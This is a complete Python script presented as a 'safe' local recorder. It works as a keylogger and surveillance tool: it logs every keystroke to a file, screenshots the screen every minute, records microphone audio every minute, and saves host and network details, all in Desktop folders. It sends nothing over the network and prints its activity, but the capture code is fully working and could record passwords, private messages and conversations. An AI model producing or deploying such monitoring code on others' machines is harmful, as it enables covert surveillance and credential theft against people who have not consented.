#!/usr/bin/env python3
"""
Local Recorder – Safe version with organised folders.
Logs keystrokes, takes screenshots, records microphone,
and saves system info. All files go into separate folders
under 'local_recorder' on your Desktop.
"""

import os
import sys
import time
import threading
import datetime
import socket
import platform
import wave

# ------------------- Dependency Check & Installation -------------------
try:
    import pyscreenshot
    import sounddevice as sd
    from pynput import keyboard
    from PIL import Image
except ModuleNotFoundError:
    from subprocess import call
    modules = ["pyscreenshot", "sounddevice", "pynput", "Pillow"]
    print("Installing missing modules:", modules)
    call([sys.executable, "-m", "pip", "install"] + modules, shell=False)
    import pyscreenshot
    import sounddevice as sd
    from pynput import keyboard
    from PIL import Image

# ------------------- Folder Configuration -------------------
DESKTOP = os.path.join(os.path.expanduser("~"), "Desktop")
MAIN_DIR = os.path.join(DESKTOP, "local_recorder")   # main folder

# Subfolders
KEY_DIR = os.path.join(MAIN_DIR, "key")
SCREENSHOT_DIR = os.path.join(MAIN_DIR, "screenshot")
SYSINFO_DIR = os.path.join(MAIN_DIR, "sys_info")
MIC_DIR = os.path.join(MAIN_DIR, "microphone")

# Create all folders if they don't exist
for folder in [MAIN_DIR, KEY_DIR, SCREENSHOT_DIR, SYSINFO_DIR, MIC_DIR]:
    os.makedirs(folder, exist_ok=True)

# File paths inside respective folders
KEYLOG_FILE = os.path.join(KEY_DIR, "keylog.txt")
SYSINFO_FILE = os.path.join(SYSINFO_DIR, "system_info.txt")

# ------------------- Timing Intervals -------------------
SCREENSHOT_INTERVAL = 60      # seconds between screenshots
MIC_RECORD_INTERVAL = 60      # seconds between audio recordings
MIC_RECORD_DURATION = 5       # seconds per recording

# ------------------- Local Recorder Class -------------------
class LocalRecorder:
    def __init__(self):
        self.running = True

        # Write header to keylog
        with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"\n--- Keylogging started at {datetime.datetime.now()} ---\n")

        # Save system information once at start
        self._save_system_info()

        # Start background threads for periodic tasks
        self._start_periodic_tasks()

    # ------------------- System Information -------------------
    def _save_system_info(self):
        """Gather hostname, IP, processor, OS, machine and write to file."""
        info = []
        info.append(f"Timestamp: {datetime.datetime.now()}")
        info.append(f"Hostname: {socket.gethostname()}")
        try:
            info.append(f"IP Address: {socket.gethostbyname(socket.gethostname())}")
        except:
            info.append("IP Address: unavailable")
        info.append(f"Processor: {platform.processor()}")
        info.append(f"System: {platform.system()} {platform.release()}")
        info.append(f"Machine: {platform.machine()}")
        info.append("-" * 40)

        with open(SYSINFO_FILE, "w", encoding="utf-8") as f:
            f.write("\n".join(info))
        print(f"[System info saved to {SYSINFO_FILE}]")

    # ------------------- Keystroke Logging -------------------
    def on_press(self, key):
        """Called whenever a key is pressed."""
        try:
            if hasattr(key, 'char') and key.char is not None:
                data = key.char
            else:
                if key == keyboard.Key.space:
                    data = ' '
                elif key == keyboard.Key.enter:
                    data = '\n'
                elif key == keyboard.Key.tab:
                    data = '\t'
                elif key == keyboard.Key.backspace:
                    data = '[BACKSPACE]'
                elif key == keyboard.Key.delete:
                    data = '[DELETE]'
                elif key == keyboard.Key.esc:
                    data = '[ESC]'
                else:
                    data = f'[{key.name}]'
        except Exception:
            data = f'[{key}]'

        # Write to keylog file immediately
        with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
            f.write(data)

    # ------------------- Screenshot -------------------
    def take_screenshot(self):
        """Capture the screen and save as PNG with timestamp."""
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(SCREENSHOT_DIR, f"screenshot_{timestamp}.png")
        try:
            img = pyscreenshot.grab()
            img.save(filename)
            print(f"[Screenshot saved: {filename}]")
        except Exception as e:
            print(f"[Screenshot failed: {e}]")

    # ------------------- Microphone Recording -------------------
    def record_microphone(self, duration=MIC_RECORD_DURATION):
        """Record from microphone and save as WAV."""
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(MIC_DIR, f"audio_{timestamp}.wav")
        try:
            fs = 44100  # Sample rate
            print(f"[Recording audio for {duration} seconds...]")
            recording = sd.rec(int(duration * fs), samplerate=fs, channels=1, dtype='int16')
            sd.wait()

            with wave.open(filename, 'wb') as wf:
                wf.setnchannels(1)
                wf.setsampwidth(2)  # 16-bit = 2 bytes
                wf.setframerate(fs)
                wf.writeframes(recording.tobytes())
            print(f"[Audio saved: {filename}]")
        except Exception as e:
            print(f"[Microphone recording failed: {e}]")

    # ------------------- Periodic Tasks -------------------
    def _periodic_screenshot(self):
        """Run screenshot every SCREENSHOT_INTERVAL seconds."""
        while self.running:
            time.sleep(SCREENSHOT_INTERVAL)
            if self.running:
                self.take_screenshot()

    def _periodic_microphone(self):
        """Run microphone recording every MIC_RECORD_INTERVAL seconds."""
        while self.running:
            time.sleep(MIC_RECORD_INTERVAL)
            if self.running:
                self.record_microphone()

    def _start_periodic_tasks(self):
        """Start background threads for periodic screenshot and mic recording."""
        thread_screenshot = threading.Thread(target=self._periodic_screenshot, daemon=True)
        thread_mic = threading.Thread(target=self._periodic_microphone, daemon=True)
        thread_screenshot.start()
        thread_mic.start()

    # ------------------- Start Listening -------------------
    def start(self):
        """Start keyboard listener and keep running until interrupted."""
        print(f"\n=== Local Recorder Started ===")
        print(f"Main folder: {MAIN_DIR}")
        print("Subfolders:")
        print(f"  - Key logs:      {KEY_DIR}")
        print(f"  - Screenshots:   {SCREENSHOT_DIR}")
        print(f"  - System info:   {SYSINFO_DIR}")
        print(f"  - Audio records: {MIC_DIR}")
        print("\nRecording keystrokes, screenshots (every {}s), and audio (every {}s)".format(
            SCREENSHOT_INTERVAL, MIC_RECORD_INTERVAL))
        print("Press Ctrl+C to stop.\n")

        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

    def stop(self):
        """Clean shutdown."""
        self.running = False
        with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"\n--- Keylogging stopped at {datetime.datetime.now()} ---\n")
        print("\n[Recorder stopped.]")

# ------------------- Main -------------------
if __name__ == "__main__":
    recorder = LocalRecorder()
    try:
        recorder.start()
    except KeyboardInterrupt:
        recorder.stop()
        sys.exit(0)